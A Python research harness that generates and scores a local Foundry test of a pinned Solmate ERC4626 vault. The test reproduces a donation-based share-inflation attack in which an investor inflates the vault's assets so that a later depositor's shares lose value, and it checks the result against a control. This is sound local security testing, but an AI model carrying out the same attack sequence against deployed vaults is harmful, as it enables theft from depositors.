"""First real-source D2.4Q trial: pinned Solmate ERC4626 on local native EVM.

Target and economic action grammar were preregistered *before reading source*.
Native code uses only minimal subclass hooks required for an abstract library.
No live deployment or financial exploitation; observations are property tests.
"""
from __future__ import annotations

import argparse
from hashlib import sha256
import json
from pathlib import Path
import re
import subprocess

from prism.d24q_asset_share_probe import propose_asset_share_trials


REPOSITORY='transmissions11/solmate'
REV='89365b880c4f3c786bdd453d4b8e8fe410344a69'
PATH='src/tokens/ERC4626.sol'


ERC4626_ABI=[{'type':'function','name':name,'inputs':[{'type':type_} for type_ in types]}
    for name,types in [('deposit',['uint256','address']),
                       ('redeem',['uint256','address','address']),
                       ('balanceOf',['address']),('totalAssets',[]),('totalSupply',[])]]


def _git(repo:Path,*args:str)->str:
    r=subprocess.run(['git','-C',str(repo),*args],check=False,text=True,
                     capture_output=True,timeout=30)
    if r.returncode:raise ValueError('PINNED_SOURCE_UNAVAILABLE: '+r.stderr[-150:])
    return r.stdout.strip()


def check_source(repo:Path)->dict:
    ref=_git(repo,'rev-parse','HEAD')
    if ref!=REV:raise ValueError('WRONG_TARGET_REVISION')
    origin=_git(repo,'remote','get-url','origin')
    if not origin.rstrip('/').removesuffix('.git').endswith('/'+REPOSITORY):
        raise ValueError('WRONG_ORIGIN')
    blob=_git(repo,'rev-parse',f'{REV}:{PATH}')
    data=(repo/PATH).read_bytes()
    if len(data)>200000:raise ValueError('TARGET_TOO_LARGE')
    if blob!=_git(repo,'hash-object',PATH):raise ValueError('DIRTY_TARGET')
    return {'repository':REPOSITORY,'revision':REV,'source':PATH,
            'blob_git_sha1':blob,'source_sha256':sha256(data).hexdigest(),
            'source_attested':True}


def _write(path:Path,data:str):
    path.parent.mkdir(parents=True,exist_ok=True)
    path.write_text(data,encoding='utf-8')


def _solidity(trials:list[dict])->str:
    calls=[]
    for i,x in enumerate(trials):
        a,d,v=x['seed_units'],x['donation_units'],x['victim_deposit_units']
        if a not in (1,2,5) or d not in (10,100,1000) or v not in (10,100,1000):
            raise ValueError('UNREGISTERED_TRIAL_AMOUNT')
        calls.append(f'        if (_attempt({a}, {d}, {v})) {{ ++observed; emit log_string("D24Q_WITNESS_{i}"); }}')
    return '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "solmate/src/tokens/ERC20.sol";
import "solmate/src/tokens/ERC4626.sol";

contract D24QToken is ERC20 {
    constructor() ERC20("Experiment Token", "QETH", 18) {}
    function mintForLocalEvmOnly(address who, uint256 amount) external {
        _mint(who, amount);
    }
}

contract D24QSolmateReference is ERC4626 {
    constructor(ERC20 underlying) ERC4626(underlying,"Shares","SHARE") {}
    function totalAssets() public view override returns (uint256) {
        return asset.balanceOf(address(this));
    }
}

interface D24QCheat {
    function prank(address who) external;
}

contract D24QRealSourceNativeTrial {
    event log_string(string);
    D24QCheat constant vm = D24QCheat(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant investor = address(0xA111CE);
    address constant depositor = address(0xB0B);

    function _attempt(uint256 seed, uint256 donation, uint256 victim)
       internal returns (bool)
    {
        D24QToken token = new D24QToken();
        D24QSolmateReference vault = new D24QSolmateReference(token);
        token.mintForLocalEvmOnly(investor, seed + donation);
        token.mintForLocalEvmOnly(depositor, victim);
        vm.prank(investor);
        token.approve(address(vault),type(uint256).max);
        vm.prank(depositor);
        token.approve(address(vault),type(uint256).max);
        vm.prank(investor);
        uint256 sharesA = vault.deposit(seed,investor);
        vm.prank(investor);
        token.transfer(address(vault),donation);
        uint256 victimShares;
        vm.prank(depositor);
        try vault.deposit(victim,depositor) returns (uint256 minted) {
            victimShares = minted;
        } catch {
            // Rejected deposit is neither an observed theft nor evidence of
            // universal safety; count as an unsupported economic witness.
            return false;
        }
        vm.prank(investor);
        vault.redeem(sharesA,investor,investor);
        uint256 investorResult = token.balanceOf(investor);
        uint256 victimLiquidationValue = vault.previewRedeem(victimShares);
        bool transferEvidence = investorResult > seed + donation && victimLiquidationValue < victim;
        if (!transferEvidence) return false;

        // Independent no-donation counterfactual, same seed/victim inputs.
        D24QToken controlToken = new D24QToken();
        D24QSolmateReference control = new D24QSolmateReference(controlToken);
        controlToken.mintForLocalEvmOnly(investor,seed);
        controlToken.mintForLocalEvmOnly(depositor,victim);
        vm.prank(investor);
        controlToken.approve(address(control),type(uint256).max);
        vm.prank(depositor);
        controlToken.approve(address(control),type(uint256).max);
        vm.prank(investor);
        control.deposit(seed,investor);
        vm.prank(depositor);
        uint256 noDonationShares = control.deposit(victim,depositor);
        require(control.previewRedeem(noDonationShares)>=victim,"BAD_UNDONATED_CONTROL");
        // Values are token units; gas costs and token market value are NOT
        // included, and this is not an exploit-severity or bounty verdict.
        return true;
    }

    function test_frozen_native_economic_search() public {
        uint256 observed = 0;
'''+ '\n'.join(calls) + '''
        // Logs allow a separate process to distinguish a real EVM witness
        // from a source-only hypothesis or a reverted candidate.
        if (observed == 0) emit log_string("D24Q_ZERO_ECONOMIC_WITNESSES");
        if (observed > 0) emit log_string("D24Q_SOME_ECONOMIC_WITNESSES");
        require(observed <= 27,"TRIAL_BUDGET_EXCEEDED");
    }
}
'''


def prepare(repo:Path,out:Path)->dict:
    source=check_source(repo)
    p=propose_asset_share_trials(ERC4626_ABI)
    if p['status']!='UNVERIFIED_EVM_SEARCH_PENDING':
        raise ValueError('ABI_UNSUPPORTED')
    _write(out/'foundry.toml','''[profile.default]
src = "src"
test = "test"
solc_version = "0.8.24"
remappings = ["solmate/=lib/solmate/"]
optimizer = true
optimizer_runs = 200
''')
    _write(out/'test'/'D24QSolmateNative.t.sol',_solidity(p['candidates']))
    _write(out/'trial_plan.json',json.dumps(p,indent=2,sort_keys=True)+'\n')
    _write(out/'source_attestation.json',json.dumps(source,indent=2,sort_keys=True)+'\n')
    return {'source':source,'trial_count':len(p['candidates']),
            'status':'PREPARED_NATIVE_PENDING_NO_VULNERABILITY_CLAIM'}


def score(out:Path)->dict:
    trace=(out/'forge-output.txt').read_text()
    final_logs=(trace.count('D24Q_ZERO_ECONOMIC_WITNESSES')+
                trace.count('D24Q_SOME_ECONOMIC_WITNESSES'))
    if 'Suite result: ok.' not in trace or final_logs != 1:
        raise ValueError('EVM_RESULT_MISSING_OR_AMBIGUOUS')
    indices=[int(n) for n in re.findall(r'\bD24Q_WITNESS_(\d+)\b',trace)]
    if len(indices)!=len(set(indices)) or any(i<0 or i>=27 for i in indices):
        raise ValueError('MALFORMED_REPEATED_NATIVE_WITNESS')
    has='D24Q_SOME_ECONOMIC_WITNESSES' in trace
    if has != bool(indices):raise ValueError('NATIVE_WITNESS_SUMMARY_CONFLICT')
    result={'schema':'scm.prism.d24q.unseen-real-third-party-source-trial.v1',
            'native_executed':True,'economic_transfer_witness_exists':has,
            'economic_transfer_witness_count':len(indices),
            'witness_trial_indices':indices,
            'evidence_scope':'ERC4626 minimal original library subclass and local mock underlying',
            'risk_verdict':'UNVERIFIED_SECURITY_IMPACT_ECONOMIC_REDISTRIBUTION' if has
                           else 'NO_WITNESS_IN_BOUNDED_TRIALS_UNKNOWN_NOT_SAFE',
            'confirmed_novel_public_vulnerabilities':0,'new_vulnerability_classes':0,
            'zero_days':0,'gas_cost_measured':False,
            'source_attestation':json.loads((out/'source_attestation.json').read_text())}
    _write(out/'result.json',json.dumps(result,indent=2,sort_keys=True)+'\n')
    return result


def main():
    cli=argparse.ArgumentParser()
    cli.add_argument('stage',choices=['prepare','score'])
    cli.add_argument('--repo',type=Path)
    cli.add_argument('--out',type=Path,required=True)
    args=cli.parse_args()
    if args.stage=='prepare':
        if args.repo is None:cli.error('--repo required')
        result=prepare(args.repo,args.out)
    else:result=score(args.out)
    print('D24Q_'+args.stage.upper(),json.dumps(result,sort_keys=True))


if __name__=='__main__':main()
